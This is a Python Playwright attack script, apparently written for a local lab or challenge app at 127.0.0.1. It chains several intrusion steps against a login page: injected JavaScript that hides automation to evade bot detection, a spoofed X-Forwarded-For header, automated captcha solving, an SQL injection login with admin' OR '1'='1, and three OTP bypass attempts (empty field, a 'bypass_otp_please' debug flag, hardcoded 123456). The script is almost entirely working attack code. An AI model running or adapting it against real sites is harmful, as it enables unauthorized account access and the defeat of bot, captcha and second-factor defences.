import asyncio
import json
import re
import time
from playwright.async_api import async_playwright

TARGET_URL = "http://127.0.0.1:5000"
CREDS_FILE = "creds.txt"
OUTPUT_FILE = "results.json"

STEALTH_SCRIPT = """
delete Object.getPrototypeOf(navigator).webdriver;
Object.defineProperty(navigator, 'webdriver', {
    get: () => undefined,
});
Object.defineProperty(navigator, 'plugins', {
    get: () => [1, 2, 3, 4, 5]
});
Object.defineProperty(navigator, 'languages', {
    get: () => ['en-US', 'en']
});
window.chrome = { runtime: {}, app: {} };
"""

class IntelligentCredentialEvaluator:
    def __init__(self):
        self.results = {
            "bot_detected": False,
            "auth_status": "Failed",
            "primary_auth_method": "None",
            "otp_bypass_status": "Failed",
            "total_execution_time": 0
        }
        self.start_time = None

    async def wait_and_check_url(self, page, target_pattern, wait_time=3):
        """Wait and check if URL matches"""
        for i in range(wait_time):
            await page.wait_for_timeout(1000)
            if target_pattern in page.url:
                return True
        return False

    async def run(self):
        self.start_time = time.time()
        
        async with async_playwright() as p:
            print("=" * 60)
            print("[*] ICE Intelligent Credential Evaluator")
            print("=" * 60)
            
            browser = await p.chromium.launch(
                headless=False,
                args=['--disable-blink-features=AutomationControlled', '--no-sandbox']
            )
            
            context = await browser.new_context(
                extra_http_headers={"X-Forwarded-For": "1.1.1.1"},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            
            page = await context.new_page()
            await page.add_init_script(STEALTH_SCRIPT)
            
            # ===== STEP 1: LOAD LOGIN PAGE =====
            print("\n[STEP 1] Loading login page...")
            await page.goto(f"{TARGET_URL}/login", timeout=15000)
            await page.wait_for_timeout(3000)
            
            # Check bot detection
            body_text = await page.evaluate("() => document.body.innerText")
            
            if "Access Denied" in body_text:
                self.results["bot_detected"] = True
                print("[!] BOT DETECTED! ❌")
                await page.screenshot(path="error_bot.png")
                await browser.close()
                self.save_results()
                return
            else:
                print("[+] Bot Detection Bypassed ✅")
                self.results["bot_detected"] = False
            
            # ===== STEP 2: SOLVE CAPTCHA =====
            print("\n[STEP 2] Solving captcha...")
            
            captcha_answer = None
            for attempt in range(5):
                try:
                    captcha_text = await page.locator("#captchaDisplay").inner_text(timeout=2000)
                    print(f"[*] Raw captcha: '{captcha_text}'")
                    
                    if captcha_text and '+' in captcha_text:
                        nums = re.findall(r'\d+', captcha_text)
                        if len(nums) >= 2:
                            captcha_answer = int(nums[0]) + int(nums[1])
                            print(f"[+] Solved: {captcha_text} = {captcha_answer}")
                            break
                except:
                    pass
                
                print(f"[*] Retry {attempt+1}/5...")
                await page.reload()
                await page.wait_for_timeout(2000)
            
            if captcha_answer is None:
                print("[!] Failed to solve captcha ❌")
                await page.screenshot(path="error_captcha.png")
                await browser.close()
                self.save_results()
                return
            
            # ===== STEP 3: SQL INJECTION =====
            print("\n[STEP 3] SQL Injection attack...")
            
            await page.fill('input[name="username"]', "admin' OR '1'='1")
            await page.fill('input[name="password"]', "anything")
            await page.fill('input[name="captcha"]', str(captcha_answer))
            
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(3000)
            
            print(f"[*] Current URL: {page.url}")
            
            if "/otp" in page.url:
                print("[+] SQL Injection Successful! ✅")
                self.results["primary_auth_method"] = "SQLi"
            elif "/dashboard" in page.url:
                print("[+] Direct dashboard access! ✅")
                self.results["auth_status"] = "Success"
                self.results["otp_bypass_status"] = "N/A"
                await page.screenshot(path="success_dashboard.png")
                await browser.close()
                self.save_results()
                return
            else:
                print("[!] Login failed ❌")
                await page.screenshot(path="error_login.png")
                await browser.close()
                self.save_results()
                return
            
            # ===== STEP 4: OTP BYPASS =====
            print("\n[STEP 4] Bypassing OTP...")
            
            # Check if we're on OTP page
            if "/otp" not in page.url:
                print("[!] Not on OTP page ❌")
                await browser.close()
                self.save_results()
                return
            
            # Wait for OTP input field
            try:
                await page.wait_for_selector('input[name="otp"]', timeout=5000)
                print("[*] OTP form found!")
            except:
                print("[!] OTP form not found ❌")
                await page.screenshot(path="error_otp_form.png")
                await browser.close()
                self.save_results()
                return
            
            # ---- Method 1: Empty OTP ----
            print("\n[*] Method 1: Empty OTP field...")
            await page.fill('input[name="otp"]', "")
            await page.click('button[type="submit"]')
            
            otp_success = await self.wait_and_check_url(page, "/dashboard", wait_time=5)
            
            if otp_success:
                print("[+] OTP Bypassed! (Empty Field) ✅")
                self.results["otp_bypass_status"] = "Success"
                self.results["auth_status"] = "Success"
                await page.screenshot(path="success_dashboard.png")
                await browser.close()
                self.save_results()
                return
            
            # ---- Method 2: Debug Flag ----
            print("\n[*] Method 2: Debug flag via API...")
            
            # Reload OTP page
            await page.goto(f"{TARGET_URL}/otp")
            await page.wait_for_timeout(2000)
            
            try:
                await page.evaluate("""
                    fetch('/otp', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({otp: '', debug: 'bypass_otp_please'})
                    })
                    .then(r => r.json())
                    .then(data => {
                        if(data.redirect) window.location.href = data.redirect;
                    });
                """)
                await page.wait_for_timeout(3000)
                
                if "/dashboard" in page.url:
                    print("[+] OTP Bypassed! (Debug Flag) ✅")
                    self.results["otp_bypass_status"] = "Success"
                    self.results["auth_status"] = "Success"
                    await page.screenshot(path="success_dashboard.png")
                    await browser.close()
                    self.save_results()
                    return
            except Exception as e:
                print(f"[!] Debug method error: {e}")
            
            # ---- Method 3: Hardcoded OTP ----
            print("\n[*] Method 3: Hardcoded OTP 123456...")
            
            await page.goto(f"{TARGET_URL}/otp")
            await page.wait_for_timeout(2000)
            
            try:
                await page.wait_for_selector('input[name="otp"]', timeout=5000)
                await page.fill('input[name="otp"]', "123456")
                await page.click('button[type="submit"]')
                
                otp_success = await self.wait_and_check_url(page, "/dashboard", wait_time=5)
                
                if otp_success:
                    print("[+] OTP Bypassed! (123456) ✅")
                    self.results["otp_bypass_status"] = "Success"
                    self.results["auth_status"] = "Success"
                else:
                    print("[!] All OTP methods failed ❌")
                    await page.screenshot(path="error_otp_all_failed.png")
            except Exception as e:
                print(f"[!] OTP 123456 error: {e}")
            
            # Final screenshot
            await page.screenshot(path="final_state.png")
            print("\n[+] Final screenshot saved: final_state.png")
            
            await browser.close()
        
        self.results["total_execution_time"] = int((time.time() - self.start_time) * 1000)
        self.save_results()

    def save_results(self):
        with open(OUTPUT_FILE, 'w') as f:
            json.dump(self.results, f, indent=4)
        print(f"\n{'='*60}")
        print(f"[+] RESULTS.JSON:")
        print(json.dumps(self.results, indent=4))
        print(f"{'='*60}")

async def main():
    ice = IntelligentCredentialEvaluator()
    await ice.run()

if __name__ == "__main__":
    asyncio.run(main())